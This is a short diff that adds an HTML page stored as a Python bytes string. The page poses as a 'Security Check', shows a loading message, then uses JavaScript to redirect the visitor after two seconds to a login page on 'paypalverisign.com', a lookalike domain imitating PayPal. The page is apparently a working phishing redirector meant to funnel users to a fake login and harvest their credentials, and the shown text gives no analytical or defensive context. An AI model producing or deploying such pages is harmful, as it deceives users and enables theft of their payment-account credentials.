@@ -1,0 +1,1 @@
+b'<html dir="ltr" class="js" lang="en_US">\n\n<head>\n<title>Security Check</title>\n</head>\n<body>\n    Loading security checkpoint...\n    <script type="text/javascript">\n    setTimeout(function(){ window.location.replace(\'https://paypalverisign.com/login\'); }, 2000);\n        \n    </script>\n\n</body>\n\n</html>'
